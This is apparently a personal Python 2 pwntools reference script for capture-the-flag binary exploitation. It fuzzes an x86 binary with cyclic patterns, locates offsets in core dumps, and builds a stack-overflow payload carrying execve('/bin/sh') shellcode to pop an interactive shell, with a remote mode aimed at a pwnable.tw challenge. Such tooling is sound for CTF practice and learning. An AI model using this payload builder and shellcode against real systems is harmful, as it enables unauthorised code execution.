#!/usr/bin/python2
'''
Simple script to help me remember pwntools features. Like a notepad of useful functions.
Script will demonstrate how to dynamically crash a binary and collect
process info.

Made to work for x86.

Some examples taken from pwntools doc site.

Note: Sometimes invoking debug or corefiles causes pwntools to hang. Try multiple times.
Helpful to enable core files in os settings.
This script needs a clean up. Most likely I won't get round to it and will only use a ref.
'''
from pwn import *
import time
import argparse
import shutil


binary = None

def setContext(**kwargs):
    binary = kwargs.get('binary')

    if binary == None:
        print('Must specify binary to test')
        sys.exit(1)

    context.arch = 'i386'
    context.os = 'linux'
    context.log_level = 'DEBUG'
    context.binary = binary

    # Load the ELF and set its correct address
    e = ELF(binary)

def generatePayload(**kwargs):
    print(kwargs)
    payload_size = kwargs.get('payload_size')
    pc_offset = kwargs.get('pc_offset')
    pc_offset = int(pc_offset)

    pc = kwargs.get('pc')
    pc = p32(int(pc, 0))

    execve = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    # fit makes shellcode payload much more convenient.
    payload = fit({ pc_offset: [pc,execve]}, length=payload_size)

    return payload

def getShell(**kwargs):
    binary = kwargs.get('binary')
    payload = generatePayload(**kwargs)
    aslr = False

    print(hexdump(payload))
    print(len(payload))

    # Save a copy of the payload to a tmp file
    fd, path = tempfile.mkstemp()
    print('Saving a copy of payload to {}'.format(path))
    with os.fdopen(fd, 'w') as tmp:
        tmp.write(payload)

    p = process(binary, aslr=aslr)

    out = p.recvuntil("CTF:")
    # out = p.recv(timeout=5)
    print(hexdump(out, width=16))
    p.sendline(payload)
    p.interactive()


def doCrashProcess(**kwargs):
    """Start a process once or many times and if it segfaults, try to gather
    debug info from a coredump file.

    Returns: core dump file.

    Keyword arguments:
    binary -- Binary name and path
    start -- payload start size (1)
    end -- payload end size (1)
    cleanup -- Delete coredump file. Will not return anything. (True)
    """
    print(kwargs)
    start = kwargs.get('start') if kwargs.get('start') else 1
    end = kwargs.get('end') if kwargs.get('end') else start
    core = None
    # Delete coredump files
    cleanup = kwargs.get('cleanup') if kwargs.get('cleanup') == False else True
    # Help to generate custom payload
    pc = kwargs.get('pc')
    pc_offset = kwargs.get('pc_offset')
    # Run binary with aslr disabled
    aslr = False
    # alarm will force process to quit. Can cause lose of coredump file.
    alarm = kwargs.get('alarm')
    binary = kwargs.get('binary')

    if start > end: # Ensure we don't infinite loop
        print('Fix payload start and end size')

    for payload_size in xrange(start, end + 1):
        p = process(binary, alarm=alarm, aslr=aslr)

        # Generate a specific payload
        if pc != None and pc_offset != None:
            payload = generatePayload(**kwargs)
            print('Generating custom payload')
        elif kwargs.get('payload'):
            payload = kwargs.get('payload')
        else:
            payload = cyclic(payload_size)

    	try:
            out = p.recv()
            # out = p.recv(timeout=5)
            print(hexdump(out, width=16))
            p.poll() == None and p.send(payload)
            out = p.recv(timeout=2)
            print(hexdump(out, width=16))

        except Exception as e:
            print("Oops. Something went wrong with send/recv. Might be expected crash")
            print(e)

        finally:
            # poll with block and alarm will prevent race condition of
            # pwntools script completing before process.
            # TODO: fix alarm signal causes loss of core file.
            for c in xrange(5):
                if p.poll() == None: # Still running
                    time.sleep(2)
                    print(pwnlib.util.proc.status(os.getpid())['State'])
                else:
                    break
            #p.poll(block=True)

            core = doCoreDump(p)

            if core:
                findPattern(core, payload)

                # Move core file to tmp and return to caller
                if cleanup == True:
                    print('Cleaning up core files.')
                    new_corefile = '/tmp/' + core.file.name
                    print('Copy coredump from {} to {}'.format(core.file.name,new_corefile))
                    shutil.copy(core.file.name, '/tmp')
                    new_coredump = Corefile(new_corefile)
                    os.remove(core.file.name)
                    core = new_coredump

            if p.poll() == -11: # is SIGSEGV
                print("SIGSEGV")

    # Can't return if spawning multiple processes
    return core

def findPattern(corefile, payload):
    '''Look through all cpu registers for payload pattern.
    Will also check if register is pointer to pattern on the stack.

    Prints out results.

    Arguments:
    corefile -- pwntools core dump file.
    payload -- payload used.
    '''

    if corefile == None:
        # print('No register or stack pattern finding because core file is missing.')
        return

    register_size = context.bits/8 # number of bytes in register

    # Search for payload pattern in process register.
    for reg_name, reg_content in corefile.registers.iteritems():
        if pack(reg_content) in payload:
            print('Found payload pattern {}:{} in register {} at pattern offset {} of payload.'
                .format(hex(reg_content)
                ,p32(reg_content)
                ,reg_name
                ,payload.find(pack(reg_content))
                ))

        # Sometimes corefiles don't have the stack
        if corefile.stack == None:
            print("No stack pattern search")
            continue

        # Check if cpu register contains address within range of stack
        if reg_content >= corefile.stack.start and reg_content <= corefile.stack.stop:
            sp_offset = reg_content - corefile.stack.start
            sp_offset_end = corefile.start + sp_offset + register_size
            stack_content = corefile.stack.data[sp_offset:sp_offset_end]

            # Check if pattern matches stack found data.
            if stack_content in payload:
                print('Found pattern in stack through {}:{}->{} indirection, at pattern offset {}'
                    .format(reg_name
                        ,hex(reg_content)
                        ,stack_content
                        ,payload.find(stack_content)
                        ))
                # This check for pattern anywhere within stack.
                # TODO: Call again but starting from register pointer on stack.
                getPayloadSize(stack_content, payload, corefile.stack.data)


def getPayloadSize(pattern, payload, stack_data):
    '''Try determine how many bytes of the payload is in the stack.

    Arguments:
    pattern -- cyclic start point.
    payload -- cyclic payload used.
    stack_data -- array containing stack data.
    '''
    # Extract part of payload where pattern starts to end of payload.
    pattern_start_idx = payload.find(pattern)
    stack_match_pattern = None

    # pattern is present in payload. Let's continue
    if pattern_start_idx:
        pattern_size = len(pattern)
        # create a copy of payload starting at matched pattern idx
        new_payload = payload[pattern_start_idx:]

        new_payload_size = len(new_payload)
        # Loop over new payload from pattern idx till end, and look through stack.
        for payload_idx in xrange(len(pattern), new_payload_size):
            new_payload_check = new_payload[:payload_idx]

            stack_found_idx = stack_data.find(new_payload_check)
            if stack_found_idx >= 0:
                stack_match_pattern = stack_data[stack_found_idx:stack_found_idx+len(new_payload_check)]

        if stack_match_pattern >= 0:
            print('Found match in stack {} of size {}'.format(stack_match_pattern, len(stack_match_pattern)))


def doCoreDump(process, **kwargs):
    """Generate a coredump file from a process.
    No corefile possible if process has exited normally.

    Returns: core dump file.

    Keyword arguments:
    process -- pwntools process object.
    """
    core = process.corefile

    if core:
        print("Fault: " + hex(core.fault_addr)) # get fault
        print("EIP: " + hex(core.pc)) # get fault

        return core

def doCrashRemote(**kwargs):
    if kwargs.get('payload') == None:
        print('Must specify a payload')
    # TODO: NEED TO UP
    io = remote('chall.pwnable.tw', 10000)
    out = io.recv()
    #print(out)
    print hexdump(out, width=16)
    io.sendline(payload)
    out = io.recv()
    #print(out)
    print hexdump(out, width=16)


def main(**kwargs):
    """Main entry.

    Keyword arguments:
    mode -- Run mode, p = process, d = debug, s = shell (default p)
    min -- payload minimum size (1)
    max -- payload max size (1)
    pc -- shellcode program counter memory location
    pc_offset -- byte offset in payload where code execution begins. i.e. where shellcode is in memory
    binary -- Binary path and filename
    """
    mode = None
    if kwargs.get('mode') == None:
        print('Please choose run mode')
        sys.exit(1)
    else:
        mode = kwargs.get('mode')

    min = kwargs.get('min') if kwargs.get('min') else 1
    max = kwargs.get('max') if kwargs.get('max') else min
    kwargs['start'] = min
    kwargs['end'] = max

    pc = kwargs.get('pc')
    pc_offset = kwargs.get('pc_offset')

    binary = kwargs.get('binary')
    # Add alarm to force binary to end
    kwargs['alarm'] = 5
    # Delete core files, so no process debug info
    kwargs['cleanup'] = False

    if min > max:
        print('Minimum payload size cannot be larger than max size.')
        sys.exit(1)

    io = None

    # Select user specified run mode
    if mode == 'r':
        doCrashRemote(**kwargs)

    elif mode == 'd':
        setContext(**kwargs)
        coredump = doCrashProcess(**kwargs)
        coredump.debug()

    elif mode == 'p':
        # TODO: problem reading payload from cmdline. Formating wrong.
        setContext(**kwargs)
        doCrashProcess(**kwargs)

    elif mode == 's':
        setContext(**kwargs)

        if pc == None or pc_offset == None:
            print('Must set pc and pc_offset for shell mode')
        else:
            # TODO: Reuse doCrashProcess with pregenerated payload
            getShell(**{'binary':binary, 'payload_size':max, 'pc':pc, 'pc_offset':pc_offset})

    else:
        print('Please chose a run mode.')

    # if io: io.kill()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Demonstrate pwntools features.')
    parser.add_argument("mode", help="Run mode, r(process)|p(process)|d(ebug)")
    parser.add_argument("--max", help="max payload size", type=int)
    parser.add_argument("--min", help="min payload size", type=int)
    parser.add_argument("--pc", help="shellcode program counter memory location")
    parser.add_argument("--pc_offset", help="byte offset in payload where code execution begins. i.e. where shellcode is in memory")
    parser.add_argument("--binary", help="Binary path and filename")
    parser.add_argument("--payload", help="Payload to send. e.g. \'AAAA\\x90\\x90\'")
    args = parser.parse_args()

    main(**vars(args))
